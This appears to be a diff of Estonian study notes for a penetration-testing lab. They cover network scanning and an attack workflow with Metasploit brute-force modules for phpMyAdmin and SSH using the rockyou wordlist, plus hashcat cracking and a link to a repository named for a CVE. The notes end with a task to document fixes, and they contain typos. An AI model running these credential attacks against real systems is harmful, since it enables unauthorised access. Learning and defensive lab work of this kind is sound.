@@ -1,3 +1,4 @@
+pentestgpt.ai?
 pfSense eeldab, et esimeses adapteris on internet ja teises oma VLAN
 
 FIX https://github.com/kh4sh3i/CVE-2025-32463.git
@@ -12,4 +13,22 @@ sudo nmap -sV -O 192.168.1.0/24
 
 Kui on väga vaja SSH-d väljast siis tee port knocking. Standard on VPN > ssh
 
+Kõigepealt skännime võrku
+Leiame pordid/teenused
+Leiame versioonid (whatweb <ip>)
+Leiame kõik välja ulatuvad failid (dirsearch -u <ip/url>)
+Leiame nõrkused (näiteks wp-admin ning proovime mis kasutajad eksisteerivad)
+Proovime rünnata kõige suurema tasuga ja kõige väiksema riskiga süsteemi (näiteks php)
+  msfconsole use auxiliary/scanner/http/phpmyadmin_login
+    #--------wordpress bruteforce------------
+    set rhost <ip>
+    set targeturi /phpmyadmin/index.php
+    exho root >> /tmp/user.txt
+    set user_file /tmp/user.txt
+    set pass_file /home/user/Documents/rockyou.txt
+    run (see käsk teeb sind kriminaaliks)
+  hashcat 'leitudhash' /word/list/location.txt.gz
+  #------------SSH----------------
+  use auxiliary/scanner/ssh/ssh_login
 
+Loo dokument kuidas fixida kõik kolm rünnakut
